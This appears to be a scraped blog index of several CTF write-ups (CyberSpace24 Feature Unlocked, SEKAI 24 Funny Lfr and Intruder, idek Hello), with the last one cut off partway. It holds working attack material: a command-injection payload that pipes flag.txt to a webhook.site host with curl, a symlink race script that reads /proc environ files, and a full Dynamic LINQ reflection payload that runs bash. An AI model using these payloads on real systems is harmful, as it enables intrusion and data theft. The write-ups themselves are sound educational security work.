Running python gen.py should give us the token\nAnd it did! Let\u0026rsquo;s now craft another script solve.py to retrieve the flag.txt\nsolve.py import requests # Replace these values with your actual values access_token = \u0026#39;ImFjY2Vzc19ncmFudGVkIg.ZtWNIQ.efPFQEBT8jNFoIlWVhjSeYC2Iuk\u0026#39; feature_url = \u0026#39;https://feature-unlocked-web.challs.csc.tf/feature\u0026#39; # Text to be sent to the /feature endpoint for word count testing text_body = \u0026#39;This; cat flag.txt | curl -X POST -d @- https://webhook.site/ea19e1c2-91bb-469b-bfd4-8f3608541e56\u0026#39; # Create the headers with the access token headers = { \u0026#39;Cookie\u0026#39;: f\u0026#39;access_token={access_token}\u0026#39; } # Create the payload with the text to be processed data = { \u0026#39;text\u0026#39;: text_body } # Make the POST request to the /feature endpoint response = requests.post(feature_url, headers=headers, data=data) # Print the response from the server print(f\u0026#34;Status Code: {response.status_code}\u0026#34;) print(\u0026#34;Response Content:\u0026#34;) print(response.text) Running python solve.py should send a request to our webhook, and we should see the flag there.\nThere we go~ flag is: CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}\nFrom this challenge, we learned the importance of:\nUnderstanding Validation Mechanisms: Knowing how to manipulate and bypass validation checks can help in exploiting such features. Using Debug Parameters: Identifying how debug modes or parameters can be leveraged to control or redirect application behavior. Remote Code Execution (RCE): Recognizing and exploiting RCE vulnerabilities, especially in contexts where subprocess commands are involved. Custom Validation Servers: Realizing the risks of trusting external or custom validation servers without proper security checks. ","permalink":"https://hxuu.github.io/blog/ctf/cyberspace24/feature-unlocked/","summary":"In this CTF challenge, we exploited a web app\u0026rsquo;s validation mechanism by setting a custom validation server with debug mode enabled. This allowed us to bypass feature access controls and perform Remote Code Execution (RCE) to retrieve the flag.","title":"CyberSpace24 - Feature Unlocked"},{"content":"Challenge Description n c p s a a o o m t i l e e n v : g t e o s s f r : : u y n : 1 3 n 8 6 y w 3 e s l b o f l r e v x e p s l o i t a t i o n You can access the challenge via SSH:\nncat -nlvp 2222 -c \u0026#34;ncat --ssl funny-lfr.chals.sekai.team 1337\u0026#34; \u0026amp; ssh -p2222 user@localhost SSH access is only for convenience and is not related to the challenge.\nAnalysis We are given the following source files:\n‚îú‚îÄ‚îÄ app.py ‚îî‚îÄ‚îÄ Dockerfile Which represent a simple Starlette application:\nfrom starlette.applications import Starlette from starlette.routing import Route from starlette.responses import FileResponse async def download(request): return FileResponse(request.query_params.get(\u0026#34;file\u0026#34;)) app = Starlette(routes=[Route(\u0026#34;/\u0026#34;, endpoint=download)]) And a Dockerfile\nFROM python:3.9-slim RUN pip install --no-cache-dir starlette uvicorn WORKDIR /app COPY app.py . ENV FLAG=\u0026#34;SEKAI{test_flag}\u0026#34; CMD [\u0026#34;uvicorn\u0026#34;, \u0026#34;app:app\u0026#34;, \u0026#34;--host\u0026#34;, \u0026#34;0\u0026#34;, \u0026#34;--port\u0026#34;, \u0026#34;1337\u0026#34;] At first glance the challenge seems very simple. You make a request to /?file=\u0026lt;path\u0026gt; and get the file contents displayed to you.\nInside SSH The flag as highlighted by the Dockerfile is stored inside an environment variable called FLAG. Doing a quick google search, we can see that environment variables in linux systems are stored in the /proc/pid/environ file.\nWith that knowledge in hand, we should get the flag just by getting the results of /proc/self/environ which stores the environment variables of the current running process.\nRight?\nWe got nothing\u0026hellip; That\u0026rsquo;s weird.\nWe know the application should return the contents of the files we ask for. However, asking for /proc/self/environ doesn\u0026rsquo;t return anything. Why?\nWell, the python application is a Starlette application that adheres to ASGI specs, the FileResponse class is responsible for returning files to the client. Before serving a file, FileResponse checks the file\u0026rsquo;s size using the os.stat syscall.\nfrom Starlette source code The os.stat function retrieves various attributes about a file, such as its size, modification time, and permissions. When os.stat is called on a file, it checks the filesystem for this information.\nHowever, in the case of /proc/self/environ, which resides within the procfs virtual filesystem (VFS), there‚Äôs a unique situation. The procfs VFS provides access to kernel and process information, and many files within it are not regular files but rather interfaces to the kernel\u0026rsquo;s data structures. These files often have special behaviors, and their contents may be dynamically generated when accessed.\nWhen os.stat checks /proc/self/environ, it reports the file size as zero because, in many cases, the file doesn‚Äôt have a traditional size; it\u0026rsquo;s an interface to process-specific information that‚Äôs only generated on demand. Consequently, when FileResponse sees a size of zero, it might interpret this as an empty or non-existent file, even though reading from /proc/self/environ would normally return environment variables for the process.\nThis behavior can lead to the application not returning any content when asked for /proc/self/environ, despite the file being non-empty in a traditional sense. The mismatch between how os.stat reports the file\u0026rsquo;s size and the file\u0026rsquo;s actual contents in procfs is the root cause of this issue.\nSo, what can we do then?\nIt turns out, we can trigger a race condition to do the following:\nrequest a file whose size is greater than 0. right after os.stat and before the actual read, we swap the latter file, with the desired file which is /proc/pid/environ. To achieve such a thing, we can make use of symlinks, create a symlink that points to a bigger file, bypass the os.stat step, then right before the file read, we change the link to /proc/pid/environ and successfully get the flag.\nExploitation To trigger the race condition, let\u0026rsquo;s first create a bash script that creates a large file, create a symlink to it, and then create an infinite loop which swaps the links between this file and /proc/pid/environ.\nNote that you should replace pid with the actuall process id of the running python application. You can figure that using ps aux. pid=7 in my case.\nsolve.sh #!/usr/bin/env bash cat /etc/passwd \u0026gt; /home/user/big-file.txt ln -s big-file.txt /home/user/the-link while true; do ln -sf /proc/7/environ /home/user/the-link ln -sf /home/user/big-file.txt /home/user/the-link done Running this on remote, and doing few curls of the the-link file should give us the flag.\nFlag is: SEKAI{b04aef298ec8d45f6c62e6b6179e2e66de10c542}\nThings we learned from this challenge:\nHere are the key lessons from the challenge:\nos.stat and procfs: Learned how os.stat retrieves file attributes and why it reports /proc/self/environ as size zero in procfs.\nRace Condition Exploit: Discovered how to exploit race conditions using symlinks to bypass os.stat and read sensitive files.\nSymlink Usage: Learned to manipulate file paths using symlinks for exploitation purposes.\n","permalink":"https://hxuu.github.io/blog/ctf/sekai24/funny-lfr/","summary":"The article explains exploiting a race condition in a Starlette app to bypass \u003ccode\u003eos.stat\u003c/code\u003e checks, using symlinks, and ultimately retrieving the flag from \u003ccode\u003e/proc/self/environ\u003c/code\u003e.","title":"SEKAI 24 - Funny Lfr"},{"content":"Challenge Description n c p s a a o o m t i l e e n v : g t e o s s I r : : n y t : 1 8 r 0 9 u w 0 d e p s e b t o r s l e v x e p s l o i t a t i o n I just made a book library website! Let me know what you think of it!\nNote: Due to security issue, you can\u0026rsquo;t add a book now. Please come by later!\nSolution We are given the following web page:\nThe application is built using ASP.NET Core, which is a cross-platform framework for developing dynamic, high-performance web solutions. You can read more here\nLet\u0026rsquo;s examine the website functionality.\nWe can search for books.\nand we can add books, but as the challenge description said, the add functionality is actually removed, and nothing happens when we try to upload anything.\nI\u0026rsquo;m assuming the search functionality is our attack vector then. Luckily for us, we\u0026rsquo;re given the source for this application here, and has the following structure:\n. ‚îú‚îÄ‚îÄ docker-compose.yml ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ flag.txt ‚îú‚îÄ‚îÄ proxy.conf ‚îî‚îÄ‚îÄ src ‚îú‚îÄ‚îÄ appsettings.Development.json ‚îú‚îÄ‚îÄ appsettings.json ‚îú‚îÄ‚îÄ createdump ‚îú‚îÄ‚îÄ CRUD ‚îú‚îÄ‚îÄ CRUD.deps.json ‚îú‚îÄ‚îÄ CRUD.dll ‚îú‚îÄ‚îÄ CRUD.pdb ‚îú‚îÄ‚îÄ CRUD.runtimeconfig.json ‚îú‚îÄ‚îÄ [... other files ...] ‚îú‚îÄ‚îÄ System.Xml.XPath.dll ‚îú‚îÄ‚îÄ System.Xml.XPath.XDocument.dll ‚îú‚îÄ‚îÄ version ‚îÇ¬†‚îî‚îÄ‚îÄ System.Diagnostics.FileVersionInfo.decompiled.cs ‚îú‚îÄ‚îÄ WindowsBase.dll ‚îî‚îÄ‚îÄ wwwroot ‚îú‚îÄ‚îÄ CRUD.styles.css ‚îú‚îÄ‚îÄ css ‚îÇ¬†‚îî‚îÄ‚îÄ site.css ‚îú‚îÄ‚îÄ favicon.ico ‚îú‚îÄ‚îÄ img ‚îÇ¬†‚îî‚îÄ‚îÄ covers ‚îÇ¬†‚îú‚îÄ‚îÄ 10.jpg ‚îÇ¬†‚îú‚îÄ‚îÄ 8.jpg ‚îÇ¬†‚îú‚îÄ‚îÄ [... other images ...] ‚îÇ¬†‚îî‚îÄ‚îÄ 9.jpg ‚îú‚îÄ‚îÄ js ‚îÇ¬†‚îî‚îÄ‚îÄ site.js ‚îî‚îÄ‚îÄ lib Let\u0026rsquo;s check the Dockerfile first to see the setup of this application:\nDockerfile FROM mcr.microsoft.com/dotnet/aspnet:7.0 RUN useradd -m ctf COPY flag.txt /flag.txt RUN mv /flag.txt /flag_`cat /proc/sys/kernel/random/uuid`.txt RUN chown root:root /flag_*.txt RUN chmod 444 /flag_*.txt WORKDIR /app/src COPY src . RUN chown -R ctf:ctf /app/src/ RUN chmod -R +w /app/src/ USER ctf EXPOSE 80 ENTRYPOINT [\u0026#34;dotnet\u0026#34;, \u0026#34;CRUD.dll\u0026#34;] So this Dockerfile creates an ASP.NET Core container, adds a flag file with a unique name, sets permissions, and runs a .NET application as a non-root user.\nAs you can see, we are not given the actual C# code, but rather the compiled .dll version of the code. We need to decompile CRUD.dll\n\u0026ldquo;To decompile .dll code, we can use ilspycmd docker image found on github\u0026rdquo;\nCRUD.dll using System; using System.Collections.Generic; using System.Diagnostics; using System.Linq; using System.Linq.Dynamic.Core; using System.Linq.Dynamic.Core.CustomTypeProviders; using System.Reflection; // other imports using Microsoft.Extensions.Logging; namespace CRUD.Models { [DynamicLinqType] public class Book { public int Id { get; set; } public string Title { get; set; } public string Author { get; set; } public string ISBN { get; set; } public string Description { get; set; } public DateTime ReleaseDate { get; set; } public string Genre { get; set; } public string PurchaseLink { get; set; } public Book() { ReleaseDate = DateTime.Now; } } public class BookPaginationModel { public List\u0026lt;Book\u0026gt; Books { get; set; } public int TotalPages { get; set; } public int CurrentPage { get; set; } } public class ErrorViewModel { public string? RequestId { get; set; } public bool ShowRequestId =\u0026gt; !string.IsNullOrEmpty(RequestId); } } namespace CRUD.Controllers { public class BookController : Controller { private class UserSearchStats { public int RequestCount { get; set; } public DateTime LastRequestTime { get; set; } public DateTime BlockStartTime { get; set; } } private static List\u0026lt;Book\u0026gt; _books = new List\u0026lt;Book\u0026gt; { new Book { Id = 1, Title = \u0026#34;To Kill a Mockingbird\u0026#34;, Author = \u0026#34;Harper Lee\u0026#34;, ISBN = \u0026#34;9780061120084\u0026#34;, Description = \u0026#34;A novel set in the American South during the 1930s, focusing on the Finch family and their experiences.\u0026#34;, ReleaseDate = new DateTime(1960, 7, 11), Genre = \u0026#34;Fiction\u0026#34;, PurchaseLink = \u0026#34;https://www.amazon.com/Kill-Mockingbird-Harper-Lee/dp/0446310786\u0026#34; }, // other books }; private const int ThrottleTimeWindowSeconds = 10; private const int MaxRequestsPerThrottleWindow = 5; private const int BlockDurationSeconds = 300; private static Dictionary\u0026lt;string, UserSearchStats\u0026gt; _userSearchStats = new Dictionary\u0026lt;string, UserSearchStats\u0026gt;(); public IActionResult Index(string searchString, int page = 1, int pageSize = 5) { try { IQueryable\u0026lt;Book\u0026gt; source = _books.AsQueryable(); if (!string.IsNullOrEmpty(searchString)) { source = source.Where(\u0026#34;Title.Contains(\\\u0026#34;\u0026#34; + searchString + \u0026#34;\\\u0026#34;)\u0026#34;); } int num = source.Count(); int totalPages = (int)Math.Ceiling((double)num / (double)pageSize); List\u0026lt;Book\u0026gt; books = source.Skip((page - 1) * pageSize).Take(pageSize).ToList(); BookPaginationModel model = new BookPaginationModel { Books = books, TotalPages = totalPages, CurrentPage = page }; return View(model); } catch (Exception) { base.TempData[\u0026#34;Error\u0026#34;] = \u0026#34;Something wrong happened while searching!\u0026#34;; return Redirect(\u0026#34;/books\u0026#34;); } } public IActionResult Add() { return View(); } public IActionResult Detail(int id) { Book book = _books.FirstOrDefault((Book b) =\u0026gt; b.Id == id); if (book == null) { return NotFound(); } return View(book); } } public class HomeController : Controller { private readonly ILogger\u0026lt;HomeController\u0026gt; _logger; public HomeController(ILogger\u0026lt;HomeController\u0026gt; logger) { _logger = logger; } public IActionResult Index() { return View(); } public IActionResult About() { return View(); } [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)] public IActionResult Error() { return View(new ErrorViewModel { RequestId = (Activity.Current?.Id ?? base.HttpContext.TraceIdentifier) }); } } } As you can see, this ASP.NET Core MVC application uses Razor Pages for web views, allows user-driven book searches with dynamic LINQ, and is missing functionality for adding new books as expected.\nThe part we are interested in is this:\n// code above... IQueryable\u0026lt;Book\u0026gt; source = _books.AsQueryable(); if (!string.IsNullOrEmpty(searchString)) { source = source.Where(\u0026#34;Title.Contains(\\\u0026#34;\u0026#34; + searchString + \u0026#34;\\\u0026#34;)\u0026#34;); } // code below... The Dynamic LINQ library allows for constructing LINQ queries using string expressions at runtime, enabling more flexible querying by converting string-based query syntax into actual LINQ queries, as shown in the provided code where source.Where uses a dynamic query string to filter books based on the searchString.\n\u0026ldquo;LINQ (Language Integrated Query) queries are a feature in .NET that allows you to write queries directly in C# (or other .NET languages) to manipulate and retrieve data from various data sources\u0026rdquo;\nInteresting, I wonder if anything pops up if we search dynamic linq vulnerability on the internet.\nRCE directly lol, let\u0026rsquo;s read this article which describes the vulnerability here:\nUsers can execute arbitrary code and commands where user input is passed to Dynmic Linq methods such as .Where(\u0026hellip;), .All(\u0026hellip;), .Any(\u0026hellip;) and .OrderBy(\u0026hellip;). The .OrderBy(\u0026hellip;) method is commonly provided with unchecked user input by developers, which results in arbitrary code execution.\nThe vulnerability is exploited by using reflection to access and invoke methods from the current domain, akin to climbing up the inheritance tree in Python, to achieve remote code execution (RCE).\nUnfortunately though, I\u0026rsquo;m not that familiar with C#. Let\u0026rsquo;s see if we can get a PoC (proof of concept):\nHere. We got the same logic reflected in this challenge, with a payload originally looking like this:\n\" \" . G e t T y p e ( ) . A s s e m b l y . D e f i n e d T y p e s . W h e r e ( i t . N a m e = = \" A p p D o m a i n \" ) . F i r s t ( ) . D e c l a r e d M e t h o d s . W h e r e ( i t . N a m e = = \" C r e a t e I n s t a n c e A n d U n w r a p \" ) . F i r s t ( ) . I n v o k e ( \" \" . G e t T y p e ( ) . A s s e m b l y . D e f i n e d T y p e s . W h e r e ( i t . N a m e = = \" A p p D o m a i n \" ) . F i r s t ( ) . D e c l a r e d P r o p e r t i e s . W h e r e ( i t . n a m e = = \" C u r r e n t D o m a i n \" ) . F i r s t ( ) . G e t V a l u e ( n u l l ) , \" S y s t e m , V e r s i o n = 4 . 0 . 0 . 0 , C u l t u r e = n e u t r a l , P u b l i c K e y T o k e n = b 7 7 a 5 c 5 6 1 9 3 4 e 0 8 9 ; S y s t e m . D i a g n o s t i c s . P r o c e s s \" . S p l i t ( \" ; \" . T o C h a r A r r a y ( ) ) ) . G e t T y p e ( ) . A s s e m b l y . D e f i n e d T y p e s . W h e r e ( i t . N a m e = = \" P r o c e s s \" ) . F i r s t ( ) . D e c l a r e d M e t h o d s . W h e r e ( i t . n a m e = = \" S t a r t \" ) . T a k e ( 3 ) . L a s t ( ) . I n v o k e ( n u l l , \" b a s h ; - c \u0026lt; c o m m a n d - h e r e \u0026gt; \" . S p l i t ( \" ; \" . T o C h a r A r r a y ( ) ) ) But can we actually use this payload? According to the CVE, the vulnerability only affects LINQ version 1.0.7.10 to 1.2.25. Let\u0026rsquo;s check src/CRUD.deps.json\n\u0026#34;dependencies\u0026#34;: { \u0026#34;System.Linq.Dynamic.Core\u0026#34;: \u0026#34;1.2.25\u0026#34;, \u0026#34;runtimepack.Microsoft.NETCore.App.Runtime.linux-x64\u0026#34;: \u0026#34;7.0.16\u0026#34;, \u0026#34;runtimepack.Microsoft.AspNetCore.App.Runtime.linux-x64\u0026#34;: \u0026#34;7.0.16\u0026#34; }, Beautiful, we got version 1.2.25, which means we can exploit the vulnerability!\nLet\u0026rsquo;s change our payload to be like this:\n\u0026#34;) \u0026amp;\u0026amp; \u0026#34;\u0026#34;.GetType().Assembly.DefinedTypes.Where(it.Name == \u0026#34;AppDomain\u0026#34;).First().DeclaredMethods.Where(it.Name == \u0026#34;CreateInstanceAndUnwrap\u0026#34;).First().Invoke(\u0026#34;\u0026#34;.GetType().Assembly.DefinedTypes.Where(it.Name == \u0026#34;AppDomain\u0026#34;).First().DeclaredProperties.Where(it.name == \u0026#34;CurrentDomain\u0026#34;).First().GetValue(null), \u0026#34;System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process\u0026#34;.Split(\u0026#34;;\u0026#34;.ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == \u0026#34;Process\u0026#34;).First().DeclaredMethods.Where(it.name == \u0026#34;Start\u0026#34;).Take(3).Last().Invoke(null, \u0026#34;/bin/bash;-c \\\u0026#34;cat /flag*.txt \u0026gt; /app/src/wwwroot/img/covers/output.txt\\\u0026#34;\u0026#34;.Split(\u0026#34;;\u0026#34;.ToCharArray())).GetType().ToString() == (\u0026#34; Using the search field as our attack vector.\nClick on search\nNoice, no error. Let\u0026rsquo;s now navigate to /img/covers/output.txt (we redirected the output of the flag to this file)\nThe flag is: SEKAI{L1nQ_Inj3cTshio0000nnnnn}\nThe things we learned from this challenge:\nAlways sanitize user input. Dynamic LINQ vulnerability. ","permalink":"https://hxuu.github.io/blog/ctf/sekai24/intruder/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\n\n\n\u003cdiv class=\"goat svg-container \"\u003e\n  \n    \u003csvg\n      xmlns=\"http://www.w3.org/2000/svg\"\n      font-family=\"Menlo,Lucida Console,monospace\"\n      \n        viewBox=\"0 0 216 73\"\n      \u003e\n      \u003cg transform='translate(8,16)'\u003e\n\u003ctext text-anchor='middle' x='0' y='4' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'\u003ec\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='36' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='52' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='36' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='52' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'\u003em\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='52' fill='currentColor' style='font-size:1em'\u003el\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='52' fill='currentColor' style='font-size:1em'\u003ev\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'\u003eg\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='52' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='4' fill='currentColor' style='font-size:1em'\u003eI\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'\u003ey\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'\u003e1\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='52' fill='currentColor' style='font-size:1em'\u003e8\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='4' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'\u003e0\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='52' fill='currentColor' style='font-size:1em'\u003e9\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='4' fill='currentColor' style='font-size:1em'\u003eu\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'\u003ew\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'\u003e0\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='4' fill='currentColor' style='font-size:1em'\u003ed\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='36' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='52' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'\u003eb\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='36' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='52' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='104' y='4' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='104' y='36' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='104' y='52' fill='currentColor' style='font-size:1em'\u003el\u003c/text\u003e\n\u003ctext text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='112' y='52' fill='currentColor' style='font-size:1em'\u003ev\u003c/text\u003e\n\u003ctext text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'\u003ex\u003c/text\u003e\n\u003ctext text-anchor='middle' x='120' y='52' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='128' y='52' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'\u003el\u003c/text\u003e\n\u003ctext text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003c/g\u003e\n\n    \u003c/svg\u003e\n  \n\u003c/div\u003e\n\u003cp\u003eI just made a book library website! Let me know what you think of it!\u003c/p\u003e","title":"SEKAI 24 - Intruder"},{"content":"Challenge Description n c p c a a o t m t i f e e n - : g t d o s a h r : t e y e l : 1 : l 3 o w 6 A e u b g e 1 x 7 p t l h o , i t 2 a 0 t 2 i 4 o n Just to warm you up for the next Fight :\u0026ldquo;D\nNote: the admin bot is not on the same machine as the challenge itself and the .chal.idek.team:1337 URL should be used for the admin bot URL\nChallenge Analysis We\u0026rsquo;re given two links and a source code for the admin bot.\nchallenge link: http://idek-hello.chal.idek.team:1337 admin bot link: https://admin-bot.idek.team/idek-hello Since the admin bot is not on the same machine as the challenge, we should expect that the flag will be retrieved using a technique like XSS, CSRF\u0026hellip;etc\nLet\u0026rsquo;s check out the challenge website:\nEmpty huh? Let\u0026rsquo;s take a look now at the admin bot page:\nApparently, we have a form that has a url section, we can submit a URL, and the admin bot will visit this URL for us. For example:\nu r l : h t t p : / / i d e k - h e l l o . c h a l . i d e k . t e a m : 1 3 3 7 Result:\nSince the \u0026lsquo;admin\u0026rsquo; will visit our page, maybe the page that the admin was at contains information that we want, a FLAG cookie for example, but in order to verify my claim, we have to check the source code of the application. Luckily for us, the source code is available, and has the following structure:\n. ‚îú‚îÄ‚îÄ bot.js ‚îú‚îÄ‚îÄ docker-compose.yml ‚îî‚îÄ‚îÄ hello ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ init.sh ‚îú‚îÄ‚îÄ nginx.conf ‚îî‚îÄ‚îÄ src ‚îú‚îÄ‚îÄ index.php ‚îî‚îÄ‚îÄ info.php Alright, those are lots of files, let\u0026rsquo;s take a look at them in a way that will enable us to understand the logic of the application.\n1. Setting up services using Dockerfile \u0026amp; docker-compose.yml Here\u0026rsquo;s a summary of the Docker setup:\ndocker-compose.yml:\nDefines a hello service. Builds the Docker image using the hello directory. Maps host port 1337 to container port 80. Dockerfile:\nUses the latest Nginx image. Installs PHP-FPM and nano. Copies Nginx configuration, website files, and an initialization script into the container. Sets the initialization script (init.sh) as the command to run, which starts PHP-FPM and Nginx. The setup runs a web server with Nginx and PHP-FPM, accessible on port 1337 of the host machine, which maps to the challenge webpage.\n\u0026ldquo;PHP-FPM is an alternative PHP FastCGI implementation that was introduced to overcome the limitations of the traditional PHP-CGI (Common Gateway Interface). It works as a process manager, managing PHP processes and handling PHP requests separately from the web server\u0026rdquo;\n\u0026ldquo;Nginx is a web server that can also be used as a reverse proxy, load balancer, mail proxy\u0026hellip;etc\u0026rdquo;\nIn a nutshell, nginx receives our request (from the browser..etc), processes the URL according to its configuration, if the path matches a php file, it passes the request to PHP-FPM for processing, receives a response and forwards the response back to us, effectively acting as a reverse proxy.\n2. How the application works a. the challenge webpage Let\u0026rsquo;s take a look at the the two php files under the src directory:\nindex.php \u0026lt;?php function Enhanced_Trim($inp) { $trimmed = array(\u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;, \u0026#34;\\t\u0026#34;, \u0026#34;/\u0026#34;, \u0026#34; \u0026#34;); return str_replace($trimmed, \u0026#34;\u0026#34;, $inp); } if(isset($_GET[\u0026#39;name\u0026#39;])) { $name = substr($_GET[\u0026#39;name\u0026#39;], 0, 23); echo \u0026#34;Hello, \u0026#34; . Enhanced_Trim($_GET[\u0026#39;name\u0026#39;]); } ?\u0026gt; Explanation: This PHP script greets the user based on the name parameter in the query string. It removes certain characters from the name using the Enhanced_Trim function and limits the length of $name to 23 characters.\ninfo.php \u0026lt;?php phpinfo(); ?\u0026gt; Explanation: This PHP script displays detailed information about the PHP configuration and environment on the server. It‚Äôs typically used for debugging and viewing PHP settings.\nInteresting, we can see that the name query parameter is reflected in the index.php page, which means we have XSS, albeit tweaked to fit the constraints imposed on us, but what is the purpose of info.php? Let\u0026rsquo;s find out.\n\u0026ldquo;phpinfo ‚Äî Outputs information about PHP\u0026rsquo;s configuration\u0026rdquo;\nb. the bot webpage /* script revamped from corctf this does not match the remote setup exactly, which uses the redpwn admin bot this is just to facilitate local testing npm i puppeteer */ let puppeteer; const { parseArgs } = require(\u0026#34;util\u0026#34;); const options = { CHALLENGE_ORIGIN: { type: \u0026#34;string\u0026#34;, short: \u0026#34;c\u0026#34;, default: \u0026#34;http://localhost:1337\u0026#34; } }; let { values: { CHALLENGE_ORIGIN }, positionals: [ TARGET_URL ] } = parseArgs({ args: process.argv.slice(2), options, strict: false }); if (!TARGET_URL) { console.error(`\\ Usage: node bot.js [-c CHALLENGE_ORIGIN] TARGET_URL Arguments: TARGET_URL: the url that the admin bot will visit Options: CHALLENGE_ORIGIN: the origin 